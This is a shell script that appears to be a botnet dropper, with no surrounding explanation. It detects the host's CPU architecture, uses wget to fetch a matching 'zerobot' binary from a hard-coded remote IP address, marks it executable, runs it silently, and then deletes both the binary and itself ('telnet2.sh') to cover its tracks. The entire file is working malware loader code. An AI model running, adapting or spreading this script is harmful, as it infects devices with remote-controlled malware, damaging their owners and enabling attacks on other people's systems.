#!/bin/sh
cd /tmp 2>/dev/null || cd /var/run 2>/dev/null || cd /mnt 2>/dev/null || cd /root 2>/dev/null || cd / 2>/dev/null

HOST="178.83.188.141"
BIN_DIR="fvbig"
PREFIX="zerobot."
BIN=""

ARCH=$(/bin/busybox uname -m 2>/dev/null || uname -m 2>/dev/null || echo "")

case "$ARCH" in
    armv4l|armv4*) BIN="arm" ;;
    armv5l|armv5*) BIN="arm5" ;;
    armv6l|armv6*) BIN="arm6" ;;
    armv7l|armv7*) BIN="arm7" ;;
    armv8*|aarch64) BIN="arm64" ;;
    i?86|i586|i686) BIN="i686" ;;
    x86_64|amd64) BIN="x86_64" ;;
    mips) BIN="mips" ;;
    mipsel) BIN="mpsl" ;;
    powerpc|ppc) BIN="ppc" ;;
    sh4) BIN="sh4" ;;
    m68k) BIN="m68k" ;;
    sparc) BIN="spc" ;;
    arc) BIN="arc" ;;
    *) BIN="arm7" ;;
esac

download_file() {
    FILE="$1"
    URL="http://${HOST}/${BIN_DIR}/${FILE}"

    /bin/busybox wget -q -O "$FILE" "$URL" >/dev/null 2>&1 && return 0
    wget -q -O "$FILE" "$URL" >/dev/null 2>&1 && return 0

    return 1
}

FN="${PREFIX}${BIN}"
URL="http://${HOST}/${BIN_DIR}/${FN}"

rm -f "$FN"
if download_file "$FN" "$URL"; then
    chmod +x "$FN"
    ./"$FN" "$FN" >/dev/null 2>&1
    rm -f "$FN"
fi

rm -f telnet2.sh